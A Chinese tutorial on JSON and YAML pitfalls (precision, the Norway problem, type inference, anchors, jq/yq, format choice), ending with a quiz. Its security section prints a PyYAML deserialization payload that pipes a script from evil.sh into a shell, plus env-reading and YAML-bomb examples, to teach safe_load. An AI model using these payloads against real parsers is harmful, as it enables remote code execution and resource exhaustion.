这篇的每一个陷阱都可以用两行命令复现。先装好工具，看到反直觉的结果时立刻自己跑一遍，比读十遍文字管用。

# Debian / Ubuntu
sudo apt-get install -y jq
# yq 建议装 mikefarah 的 Go 版本（注意：不是 Python 版 yq）

模块 1

JSON 的语法边界：比你想的窄

JSON 的标准是 RFC 8259，全文不到 10 页。它的语法是刻意做窄的——窄到没有任何"可选扩展"的空间，这正是它能成为通用交换格式的原因。

六条硬性规则

规则说明
不允许注释没有 //，也没有 /* */。带注释的"JSON"是 JSONC（VS Code 配置用的那种），不是标准 JSON
不允许尾逗号{"a":1,} 和 [1,2,] 都非法。JavaScript 对象字面量允许，JSON 不允许
键必须双引号{a: 1} 非法，{'a': 1} 也非法。单引号不是 JSON
字符串必须双引号同上。转义只支持 \" \\ \/ \b \f \n \r \t \uXXXX 这几种
数字格式严格不允许前导零（01）、不允许 +1、不允许 .5、不允许十六进制 0x1F
没有 undefined只有 null。JavaScript 的 undefined 序列化时会直接丢掉这个键
// ✗ 下面每一行都不是合法 JSON
{
  "name": "张三",        // 注释不合法
  'age': 28,             // 单引号键不合法
  "score": 01,           // 前导零不合法
  "rate": .5,            // 缺整数部分不合法
  "hex": 0x1F,           // 十六进制不合法
  "tags": ["a", "b",],   // 尾逗号不合法
}

// ✓ 合法版本
{
  "name": "张三",
  "age": 28,
  "score": 1,
  "rate": 0.5,
  "tags": ["a", "b"]
}

数字精度：最容易被忽略的一类 bug

JSON 规范没有规定数字的精度，只说"符合 IEEE 754 双精度"是互操作的良好实践。实际上几乎所有语言的 JSON 解析器都用 double 存数字，而 double 只能精确表示 53 位整数。

# JavaScript / Python / jq 都是这个行为
>>> 9007199254740993        # 2^53 + 1
9007199254740992                # 少了 1！

# 一个真实的踩坑现场：雪花算法 ID
{"id": 1234567890123456789}
# 前端 JSON.parse 之后变成 1234567890123456800
# 拿去查库 → 查不到 → "订单不存在"
数值能否精确表示
Number.MAX_SAFE_INTEGER9007199254740991（253-1），安全上界
Number.MIN_SAFE_INTEGER-9007199254740991，安全下界
0.1 + 0.20.30000000000000004，浮点误差
1e400Infinity，但 JSON 里写 1e400 是合法的，解析后变无穷大
超过 253 的整数 ID 必须用字符串传。
后端序列化时把 id 转成 "1234567890123456789"，或者直接规定"所有 ID 都是字符串"。Go 的 json.Number、Python 的 parse_int=Decimal 可以在解析侧规避，但你控制不了调用方用什么语言。契约层面用字符串是最省事的解法。

NaN 与 Infinity：标准里根本不存在

# 标准 JSON 不认这三个字面量
{"x": NaN}        # ✗ RFC 8259 不合法
{"x": Infinity}   # ✗
{"x": -Infinity}  # ✗

# 但各语言实现不一致，这才是坑
python3 -c "import json; print(json.loads('{\"x\": NaN}'))"
# {'x': nan}  ← Python 默认接受！allow_nan=True

node -e "JSON.parse('{\"x\": NaN}')"
# SyntaxError: Unexpected token 'N'  ← JS 严格拒绝

# 正确做法：用 null 表示缺失，或者用字符串 "NaN"
# 严格模式序列化
json.dumps(data, allow_nan=False)   # 遇到 NaN 直接抛 ValueError
为什么 Python 会放行？因为 json 模块默认 allow_nan=True，输出的是 JavaScript 的扩展语法而不是标准 JSON。这个默认值是为了兼容科学计算场景，但对 API 来说是隐患——你的服务可能吐出前端解析不了的内容。对外接口一律 allow_nan=False。
模块 2

YAML 的语法陷阱

YAML 的设计目标是"人类可读"，代价是规则比 JSON 多得多，而且很多错误是静默的——不报错，只是解析成了别的东西。

缩进：只能空格，绝对不能 Tab

# ✗ Tab 缩进 —— 几乎所有解析器都会报错
server:
	host: 0.0.0.0
	port: 8080

# 报错信息通常是这种，非常不直观：
# found character '\t' that cannot start any token

# ✓ 两个空格（推荐）
server:
  host: 0.0.0.0
  port: 8080

# 检查文件里有没有 Tab
grep -Pn '\t' config.yaml

# 让编辑器强制把 Tab 转空格
# .editorconfig
[*.{yml,yaml}]
indent_style = space
indent_size = 2
缩进不一致比 Tab 更阴险。同一层级的键，一个用 2 空格一个用 4 空格，YAML 不会报错——它会认为后者是前者的子节点。结果是一个嵌套结构悄悄变成了另一个嵌套结构。
防御手段：① .editorconfig 统一；② CI 里跑 yamllint；③ 提交前 yq '.' f.yaml 看一遍规范化后的结构。

冒号后面必须有空格

# ✗ 冒号后没空格 —— 这不是映射，是一个普通字符串 "key:value"
key:value

# ✓
key: value

# 用 yq 验证到底解析成了什么
echo 'key:value' | yq '.'
# key:value        ← 整个文件就是一个标量字符串

# ✗ 数组项里的冒号同样要注意
- name:张三

# ✓
- name: 张三

字符串：可以不加引号，但有时候必须加

YAML 的"裸字符串"（plain scalar）很宽松，几乎任何不含特殊字符的内容都能直接写。但下面这些情况必须加引号，否则会被解析成别的类型或者直接报错。

场景不加引号的后果
on: trueon 被当成布尔键 true，键名变了
version: 1.10变成浮点数 1.1，末尾的 0 消失
port: 08080可能被当八进制，值变成 4160
date: 2024-01-01被解析成日期对象，不是字符串
msg: hello: world冒号加空格 → 解析错误或嵌套
path: C:\Users\me反斜杠是转义符，双引号内会吃掉字符
text: *important* 是别名引用符，报 "unknown anchor"
text: &ref& 是锚点定义符
expr: !ref! 是标签符（tag）
desc: " 前后有空格 "不加引号会被自动 trim 掉
empty: 值是 null，不是空字符串
hash: # 不是注释# 前面必须有空格才算注释，但裸值里的 # 极易误判
# ✗ 全部是坑
on: true
version: 1.10
port: 08080
release: 2024-01-01
path: C:\Users\me
note: *draft

# ✓ 该加引号的加引号
"on": true
version: "1.10"
port: "08080"
release: "2024-01-01"
path: 'C:\Users\me'          # 单引号内反斜杠不转义
note: "*draft"
一个偷懒但有效的规则：凡是"人眼看起来像数字、像日期、像布尔"的字符串，一律加引号。版本号、电话号码、邮编、身份证号、以 0 开头的编号——这些字段的共同点是它们语义上是标识符，不是数值。加引号零成本，不加可能出生产事故。

块标量：多行字符串

# | 保留换行（literal）；> 折叠成一行（folded）
script: |
  echo line1
  echo line2
# 值 = "echo line1\necho line2\n"

# 加 - 去掉末尾换行，加 + 保留全部
a: |-        # 不保留末尾换行
b: |+        # 保留所有末尾换行
模块 3

布尔值的地狱与 Norway 问题

这是 YAML 最著名的历史包袱。YAML 1.1（2005 年）的布尔类型定义极其宽松，而大量现役解析器仍然按 1.1 实现。

YAML 1.1 认可的布尔字面量

真假
true / True / TRUEfalse / False / FALSE
yes / Yes / YESno / No / NO
on / On / ONoff / Off / OFF
y / Yn / N

而 YAML 1.2（2009 年）的 core schema 只认 true 和 false 这六种大小写变体，把 yes/no/on/off 全部去掉了。问题在于：规范更新了，实现没跟上。

# PyYAML（最常用的 Python YAML 库）仍然是 YAML 1.1 行为
>>> import yaml
>>> yaml.safe_load("flag: no")
{'flag': False}
>>> yaml.safe_load("flag: off")
{'flag': False}
>>> yaml.safe_load("flag: y")
{'flag': True}

# 而 Go 的 gopkg.in/yaml.v3 也支持 yes/no/on/off
# 只有明确按 1.2 实现的库才只认 true/false

Norway 问题

# 一份国家代码表，看起来毫无问题
countries:
  NO: Norway
  SE: Sweden
  DK: Denmark
  FR: France

# 解析结果（YAML 1.1）
{'countries': {False: 'Norway', 'SE': 'Sweden', 'DK': 'Denmark', 'FR': 'France'}}

# NO 变成了布尔 False！
# 更惨的是，如果你还有另一行 NO（比如某个地区编号），
# 两个 False 键会冲突，后者覆盖前者，数据静默丢失
Norway 问题的本质：类型推断发生在"你没有显式声明类型"的地方。
同样的坑还有：国家代码 N（挪威的旧写法）、语言代码 NO、状态字段 ON（安大略省的缩写）、机房代号 OFF。
唯一可靠的解法：所有"看起来可能是关键字"的字符串一律加引号。写 "NO": Norway，不要指望解析器"应该懂你的意思"。

怎么判断你手上的解析器是 1.1 还是 1.2

# 一条命令测出来
printf 'a: no\nb: on\nc: 010\n' | yq -o=json '.'
# 1.1 行为：{"a": false, "b": true, "c": 8}
# 1.2 行为：{"a": "no", "b": "on", "c": 10}

# Python 侧
python3 -c "import yaml; print(yaml.safe_load('a: no'))"
# {'a': False}

# 某些库可以显式指定 schema（如 js-yaml 的 CORE_SCHEMA）
# const doc = yaml.load(str, { schema: yaml.CORE_SCHEMA });
不要试图"升级到 YAML 1.2 就好了"。你的配置会被多种工具读取：kubectl、Helm、Ansible、CI 平台、IDE 插件。它们内嵌的解析器版本各不相同。能控制的只有自己的写法：该加引号就加引号。
模块 4

多文档、锚点与合并

多文档：一个文件装多个对象

# --- 是文档分隔符，一个文件可以有任意多个文档
---
apiVersion: v1
kind: Namespace
metadata:
  name: demo

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: demo

---
apiVersion: v1
kind: Service
metadata:
  name: web
  namespace: demo

# ... 可选，表示文档结束（多用于流式输出时明确边界）
操作命令
读取全部文档yq 'select(.kind == "Service")' multi.yaml
Python 逐个读取yaml.safe_load_all(f)
按索引取第 N 个yq 'select(di == 1)' multi.yaml
拆成多个文件yq -s '.metadata.name' multi.yaml
为什么 K8s 大量用多文档？因为它把"一组相关资源"打包成一个可 kubectl apply -f 的单位。部署一个服务需要 Deployment + Service + ConfigMap + Ingress，分成四个文件容易漏、容易版本不同步，放一个文件里天然保证原子提交。

锚点与别名：YAML 的"变量"

# &name 定义锚点，*name 引用
defaults: &defaults
  image: nginx:1.25
  replicas: 2
  resources:
    limits:
      cpu: 500m
      memory: 512Mi

web:
  <<: *defaults          # 合并映射（merge key）
  name: web

api:
  <<: *defaults
  name: api
  replicas: 4            # 覆盖合并进来的 replicas

合并后的结果：api 拥有 image、replicas: 4、resources、name: api 四个键。

规则说明
锚点必须先定义不能前向引用。写成先 *defaults 后 &defaults 会报 "unknown anchor"
锚点作用域是单文档跨 --- 就失效，每个文档要重新定义
同名锚点后者覆盖同一文档内重复定义 &a 不报错，静默用最后一个
合并只对映射有效<< 不能合并数组。数组要整个替换
合并是浅合并嵌套的 resources.limits 会被整个替换，不是逐键合并
顺序决定优先级显式写的键覆盖 << 引入的键，与书写位置无关
多个来源<<: [*a, *b]，靠前的优先级高
# 浅合并的坑：你以为 limits 会保留 cpu
base: &base
  resources:
    limits: {cpu: 500m, memory: 512Mi}

prod:
  <<: *base
  resources:
    limits: {cpu: 2}       # 整个 limits 被替换

# 结果：prod.resources.limits = {cpu: 2}
# memory 不见了！如果 K8s 要求两个都填，直接报错
合并键 << 其实不是 YAML 1.2 标准的一部分，它是 YAML 1.1 的类型定义，在 1.2 里被移出核心规范，但因为太常用，主流实现都保留了。
这意味着：某些严格按 1.2 实现的解析器（以及某些 JSON Schema 校验器）可能不认识 <<，会把它当成一个普通键名。跨工具链使用前先验证。

锚点的另一个用途：避免重复长配置

# CI 配置里最典型的用法
.common: &common
  image: node:20-alpine
  cache:
    key: npm
    paths: [node_modules]
  before_script:
    - npm ci

test:
  <<: *common
  script: npm run test

build:
  <<: *common
  script: npm run build
  artifacts:
    paths: [dist]
模块 5

类型推断陷阱：静默改写的六种情况

YAML 的标量没有类型标注，全靠解析器猜。猜错的后果不是报错，而是值悄悄变了——这类 bug 最难查，因为配置看起来完全正常。

你写的解析成为什么
version: 1.101.1（float）浮点数末尾的 0 无意义，被规范化掉
version: 1.01（int）小数点后全 0 时退化为整数
port: 0108（YAML 1.1）前导 0 表示八进制
port: 0o108（YAML 1.2）1.2 用 0o 前缀显式表示八进制
time: 12:30750（YAML 1.1）六十进制！12×60+30
date: 2024-01-01date 对象ISO 8601 日期被自动识别
ts: 2024-01-01T00:00:00Zdatetime 对象时间戳自动转换
ratio: 1e31000.0（float）科学计数法
hex: 0xFF255十六进制字面量
val: .infInfinityYAML 支持无穷大
val: .nanNaNYAML 支持 NaN
val: ~null~ 是 null 的另一种写法

版本号：最常见的翻车点

# ✗ 灾难写法
dependencies:
  lodash: 4.17.21
  react: 18.2.0
  typescript: 5.10        # 解析成 5.1！

# 更隐蔽的：两个不同版本被解析成同一个值
a: 1.10    # → 1.1
b: 1.1     # → 1.1
# 冲突了，后者覆盖前者，你丢了一个依赖

# ✓ 版本号永远加引号
dependencies:
  lodash: "4.17.21"
  react: "18.2.0"
  typescript: "5.10"

八进制：端口号的重灾区

# 有人为了对齐写成 08080
server:
  port: 08080          # → 4160（八进制）

# 更常见的：文件权限
mode: 0644             # → 420（十进制），如果下游要八进制就错了

# ✓ 明确写十进制，或者加引号
mode: "0644"
port: 8080

六十进制：一个几乎没人知道的坑

# YAML 1.1 支持六十进制（sexagesimal），用于时间表示
duration: 1:30         # → 90（1 分钟 30 秒 = 90 秒）
duration: 12:30        # → 750
duration: 1:30:30      # → 5430（1 小时 30 分 30 秒）

# 这意味着：任何形如 "数字:数字" 的值都会被转成整数
# 包括时间、比例、比分、章节号……

# ✓ 一定加引号
duration: "1:30"
YAML 1.2 已经删掉了六十进制，但 PyYAML、libyaml、Ruby Psych 等大量实现仍然保留。
这条规则最阴险的地方在于：它只在值恰好是 数字:数字 格式时触发。你的配置里 99% 的时间字段都是 "09:00" 这种带引号的，唯独某个 timeout: 1:30 忘了加，就变成了 90。

时间戳：跨时区的隐形炸弹

# 不带时区的时间戳，解析成本地时间
created: 2024-01-01 00:00:00
# Python 得到 naive datetime，没有 tzinfo

# 带 Z 的，解析成 UTC
created: 2024-01-01T00:00:00Z

# 带偏移的
created: 2024-01-01T08:00:00+08:00

# 只写日期，得到 date 而不是 datetime
created: 2024-01-01       # datetime.date(2024, 1, 1)

# 下游如果用 json.dumps 序列化，会直接抛 TypeError：
# Object of type date is not JSON serializable
一条通用防御规则：配置文件里除了真正的数字和布尔，其他全部加双引号。
代价是配置稍微啰嗦，收益是彻底消灭类型推断问题。K8s 的官方示例其实一直在这么做——"8080" 这种写法看起来多余，但它保证了 kubectl 和 Helm 模板渲染时不会出现类型漂移。
模块 6

工具链：jq、yq、Schema 校验

jq：JSON 的 sed

# 基础取值
jq '.name'                     # 取字段（输出带引号）
jq -r '.name'                  # raw 模式，去掉引号（shell 脚本必用）
jq '.items[0]'                 # 数组第一个
jq '.items[-1]'                # 最后一个
jq '.items[]'                  # 展开数组
jq '.a.b.c // "默认值"'         # 缺失或 null 时给默认值

# 过滤与映射
jq '.items[] | select(.status == "ok")'        # 过滤
jq '[.items[] | select(.age > 18)]'            # 过滤后重新组成数组
jq '.items | map(.id)'                         # 提取某字段组成新数组
jq '.items | length'                           # 长度
jq 'keys'                                      # 所有键名
jq 'to_entries'                                # 对象转 [{key,value}]

# 构造新对象
jq '{id: .id, name: .user.name}'               # 重组结构
jq '.items | group_by(.type) | map({type: .[0].type, n: length})'

# 修改
jq '.a.b = 1'                                  # 赋值
jq '.a.b |= . + 1'                             # 更新（读改写）
jq 'del(.password)'                            # 删字段
jq '.items |= map(select(.id != 3))'           # 删数组元素

# 输出格式
jq -c '.'                                      # 紧凑单行（日志、传输）
jq -S '.'                                      # 键名排序（diff 友好）
jq --indent 2 '.'                              # 指定缩进
jq -s '.'                                      # slurp：把多行 JSON 合成数组
jq -e '.ok == true'                            # 用退出码表达断言（CI 里常用）

# 传参（避免拼接字符串导致的注入）
jq --arg name "$USER" '.user = $name'
jq --argjson n 5 '.count = $n'
jq -e 是被低估的功能。它让 jq 变成断言工具：表达式结果为 false 或 null 时退出码为 1。
在 CI 里写 jq -e '.status == "healthy"' health.json || exit 1，比写一段 Python 判断短得多，而且不需要额外依赖。

yq：YAML 的 jq

# 读取
yq '.spec.replicas' deploy.yaml
yq '.spec.template.spec.containers[].image' deploy.yaml

# 原地修改（-i 会重写文件，注释可能丢失，先备份）
yq -i '.spec.replicas = 3' deploy.yaml

# 格式转换
yq -o=json '.' config.yaml          # YAML → JSON
yq -p=json '.' config.json          # JSON → YAML
yq -o=props '.' config.yaml         # → properties

# 多文档处理
yq 'select(.kind == "Deployment")' multi.yaml
yq ea '. as $item ireduce ({}; . * $item)' a.yaml b.yaml   # 深度合并

# 排序键名，方便 diff
yq -P '.' config.yaml
yq -i 会重写整个文件，注释和格式可能丢失。特别是用 yq 改 Helm values 或带大量注释的配置文件时，改完 diff 里全是格式变动，看不出真正的逻辑改动。
替代方案：① 改之前 cp 备份；② 只在小范围、格式稳定的文件上用 -i；③ 需要保留注释时用 yq 输出到新文件再人工合并。

模块 7

五种配置格式怎么取舍

格式优势劣势适合
JSON语法最简单、所有语言原生支持、解析最快不能写注释、不能有尾逗号、手写痛苦、不支持多行字符串机器间传输、API 响应、需要严格 schema 的数据
YAML可读性好、支持注释、多文档、锚点复用缩进敏感、类型推断坑多、规范有 1.1/1.2 分裂、大文件难维护K8s 清单、CI 配置、需要人频繁编辑的配置
TOML无歧义、类型明确、支持注释、日期原生类型深层嵌套啰嗦（[a.b.c.d] 一串）、数组嵌套表达力弱项目元数据、包管理清单（Cargo、pyproject）
INI极其简单、老工具都认只有一层、无类型（全是字符串）、无标准传统服务配置（my.cnf、php.ini）、简单开关
.env最贴近 12-Factor、部署时注入方便扁平、无嵌套、无类型、容易被误提交密钥、环境相关的开关、容器注入

为什么 K8s 选了 YAML

  • 需要注释。一份 Deployment 里到处是"为什么 replicas 是 3"、"这个探针阈值调过"的说明，JSON 做不到
  • 需要多文档。一个文件装 Deployment + Service + ConfigMap，kubectl apply -f 一次搞定
  • 需要锚点。CI/CD 模板里复用大段 resources、env 配置
  • 接受代价。K8s 用服务端强校验兜底——YAML 解析出来的结构必须通过 OpenAPI Schema，写错了 kubectl apply 直接拒绝。这抵消了 YAML 类型推断的风险
这里有个重要的设计启示：选 YAML 的前提是你有强校验。如果你只是拿 YAML 当"随便写写的配置文件"，没有 schema、没有 lint、没有 CI 检查，那 YAML 的坑会全部落在你头上。格式的宽松必须由校验来补偿。

为什么 Rust 生态爱 TOML

  • Cargo.toml 是事实标准，整个生态跟着用（rustfmt.toml、clippy.toml、taplo.toml）
  • 无类型歧义。1.0 是浮点、"1.0" 是字符串，没有 yes/no 布尔，没有六十进制。对一门强调"编译期确定"的语言，配置也不该有惊喜
  • 日期时间是一等类型。2024-01-01T00:00:00Z 直接映射到 chrono 类型，不需要字符串解析
  • 表结构清晰。[dependencies] 这种显式分节比缩进更容易机器生成和校验

实际项目里的常见组合

依赖元数据用 TOML，服务间传输用 JSON，K8s 与 CI 用 YAML，密钥用环境变量或 .env。能收敛到两种格式就收敛到两种——一个项目同时用四种格式，结果是新人要学四套语法、CI 要装四个解析器、改一个配置要在四个文件间跳。

不要把 .env 当配置文件用。它只有字符串、没有嵌套、没有类型，一旦配置超过 20 个键就会变成一团无序的键值堆。它只该承载"随环境变化且不宜入库"的那部分，其余放进 YAML/TOML 并用变量引用。
模块 8

安全：反序列化能执行代码

这是本篇最重要的一节。YAML 不只是一个"数据格式"——它的规范里有标签（tag）机制，允许在文档里指定"这个值应该被反序列化成某个语言对象"。这给了攻击者一条直达代码执行的路径。

攻击是怎么发生的

# 一个看起来无害的 YAML
name: demo
config: !!python/object/apply:os.system ["curl http://evil.sh | sh"]

# 用不安全的 loader 解析
import yaml
yaml.load(open('untrusted.yaml'))     # 命令执行了

# 更隐蔽的写法（不显眼，混在正常配置里）
!!python/object/apply:subprocess.check_output
  - ["whoami"]

# 或者读文件外带
!!python/object/apply:eval ["__import__('os').environ"]

原理是：!!python/object/apply 这个标签告诉 PyYAML"请用这些参数调用这个函数，把返回值作为节点值"。反序列化过程中就会真的调用 os.system。

各语言的对应风险

语言/库危险 API安全做法
Python PyYAMLyaml.load(f)yaml.safe_load(f)
Python PyYAMLyaml.load(f, Loader=yaml.FullLoader)Loader=yaml.SafeLoader
Ruby PsychYAML.load(str)YAML.safe_load(str, permitted_classes: [])
Java SnakeYAMLnew Yaml()new Yaml(new SafeConstructor(new LoaderOptions()))
JS js-yamlyaml.load()（v4 前）yaml.load(str, { schema: CORE_SCHEMA })
Go yaml.v3默认不执行任意类型但要注意 !!binary 之类的标签处理
# PyYAML 6.0 之后，yaml.load 强制要求 Loader 参数
# 所以裸写 yaml.load(f) 会直接 TypeError，这算是被逼着安全
>>> yaml.load(open('a.yaml'))
TypeError: load() missing 1 required positional argument: 'Loader'

# 但仍然有人为了"跑通"随手写 FullLoader —— 它依然不安全
>>> yaml.load(s, Loader=yaml.FullLoader)   # ✗ 仍可构造部分攻击

# ✓ 正确写法
>>> yaml.safe_load(s)
>>> yaml.load(s, Loader=yaml.SafeLoader)   # 等价

# 多文档
>>> list(yaml.safe_load_all(f))
safe_load 也不是万能的。它只保证"不构造任意 Python 对象"，但仍然会：
① 解析超大的锚点展开（YAML 炸弹，见下）；
② 接受 !!python/name 之外的合法标签，某些库会把这些标签映射到业务类型；
③ 消耗大量内存——一个 10KB 的文件可以展开成几个 GB 的对象树。
所以：对不可信输入，除了 safe_load 还要限制文件大小和解析深度。

YAML 炸弹：锚点展开攻击

# 经典的 billion laughs 变体
a: &a ["x", "x", "x", "x", "x", "x", "x", "x", "x", "x"]
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]

# 文件不到 1KB，展开后是 10^8 个字符串，内存直接打满
# safe_load 照样会中招，因为这是"合法的 YAML"
防御手段：① 限制输入大小（比如超过 1MB 直接拒绝）；② 用支持 max_aliases 限制的解析器（Go 的 yaml.v3 默认限制了别名数量，Python 侧需要自己实现）；③ 不要把解析放在主线程，加超时和内存上限；④ 最根本的——不可信输入不要用 YAML，用 JSON。

JSON 也有坑，但性质不同

JSON 的风险都在数据层面：{"__proto__": {"admin": true}} 这类原型污染（现代 JSON.parse 本身不触发，但后续的递归合并会）；几万层嵌套导致栈溢出，需要限制解析深度；重复键 {"role":"user","role":"admin"} 在规范里只说"应该唯一"，不同解析器结果不同——如果鉴权逻辑取最后一个键、而网关取第一个，就是越权漏洞。

一句话总结安全边界：JSON 的风险是数据层面的（精度、深度、重复键），YAML 的风险是执行层面的（标签可调用函数）。
所以：对外接口只收 JSON，内部配置才用 YAML，且永远 safe_load。
常见坑

十个踩过的坑

1
把版本号写成 1.10，被解析成 1.1
两个不同版本变成同一个值，依赖表里少了一项。所有版本号、编号、电话号码一律加引号。
2
国家代码 NO 变成布尔 false
YAML 1.1 把 no/off/n 都当布尔。Norway 问题。所有可能撞上关键字的字符串加引号。
3
YAML 里混入了 Tab 缩进
编辑器补全、复制粘贴、Makefile 片段都会带进来。用 grep -Pn '\t' 检查，用 .editorconfig 强制空格。
4
JSON 里加注释和尾逗号
写惯了 JS 对象字面量，切到 JSON 就报错。用 JSONC 的场景要明确说明"这不是标准 JSON"，别让它流到 API 里。
5
超过 253 的整数 ID 用 JSON number 传
前端解析后末几位变 0，查库查不到。ID 一律用字符串，或在契约里明确写"number 只用于小于 2^53 的值"。
6
用 yaml.load 解析用户上传的文件
远程代码执行。永远 safe_load，并且限制文件大小和别名数量，防止 YAML 炸弹。
7
锚点合并以为是深合并
<< 是浅合并，嵌套的映射会被整个替换而不是逐键合并。要深合并得用工具（如 yq 的 * 操作符）或 Helm 的 merge。
8
端口写成 08080
被当八进制解析成 4160。服务起在错误端口上，排查半天。端口一律不加前导零。
9
用 yq -i 改带注释的配置，注释全丢
重写文件时格式和注释无法保留。改前备份，或改用只读取 + 模板渲染的方式生成配置。
10
同一份配置被不同版本的解析器读，结果不一致
本地 PyYAML 是 1.1、CI 里的 yq 是 1.2，同一个 on: 一边是布尔一边是字符串。锁定工具版本，并在 CI 里跑同一套解析验证。
自测

六道题

1. 下面哪个是合法的 JSON？
正确答案：{"a": 1}。JSON 不允许尾逗号，键必须用双引号。这两条是 JSON 与 JavaScript 对象字面量最容易混淆的差异。
2. YAML 里写 country: NO，PyYAML 解析出来是什么？
正确答案：False。YAML 1.1 把 no/No/NO 都当布尔假。这就是 Norway 问题。解法是加引号写成 "NO"。
3. 为什么超过 253-1 的整数不能用 JSON number 传？
正确答案：精度丢失。double 的尾数只有 52 位，加隐含位共 53 位，超过就无法精确表示。雪花 ID、订单号这类必须用字符串。
4. 解析不可信的 YAML 输入，应该用？
正确答案：safe_load。FullLoader 仍然允许构造部分 Python 对象，可以被 !!python/object/apply 利用执行命令。另外还要限制文件大小，防 YAML 炸弹。
5. <<: *base 的合并行为是？
正确答案：浅合并。被合并的顶层键如果在你这里也写了，就整个替换掉，不会递归进去。所以 resources.limits 里少写一个字段就会丢。
6. YAML 里写 duration: 1:30，YAML 1.1 解析成什么？
正确答案：90。YAML 1.1 支持六十进制，1:30 表示 1 分 30 秒 = 90 秒。YAML 1.2 删掉了这个特性，但很多实现仍保留。时间类值一定加引号。
